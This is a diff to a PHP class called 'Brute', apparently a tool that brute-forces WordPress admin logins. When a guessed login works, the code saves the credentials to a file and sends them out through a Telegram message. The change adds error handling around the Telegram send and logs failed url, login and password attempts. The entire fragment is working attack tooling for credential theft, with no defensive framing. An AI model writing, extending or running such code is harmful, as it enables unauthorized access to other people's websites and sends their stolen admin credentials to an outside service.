@@ -58,7 +58,15 @@ class Brute
                 echo "Valid: {$wp_admin}" . PHP_EOL;
                 file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
-                (new Telegram())->sendMessage($wp_admin);
+                try {
+                    (new Telegram())->sendMessage($wp_admin);
+                } catch (\Throwable $t) {
+                        echo $t . PHP_EOL;
+                        exit();
+                }
+
+            } else {
+                echo "FAiLED: {$url};{$login};{$password}" . PHP_EOL;
             }
         }
     }
